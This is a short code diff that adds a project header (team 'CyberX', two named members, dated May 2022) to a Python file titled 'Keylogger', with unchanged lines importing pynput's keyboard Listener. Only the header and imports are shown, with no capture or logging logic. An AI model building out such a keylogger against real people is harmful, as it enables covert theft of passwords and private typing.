@@ -1,3 +1,12 @@
+""" 
+    Project Title:  [ Keylogger ]
+    Team: CyberX
+    Member01: KEO MONI
+    Member02: CHHAY PORHENG
+    Date: 5 MAY 2022
+    Version: v1.0
+"""
+
 # pip install pynput
 from pynput.keyboard import Listener
 import time
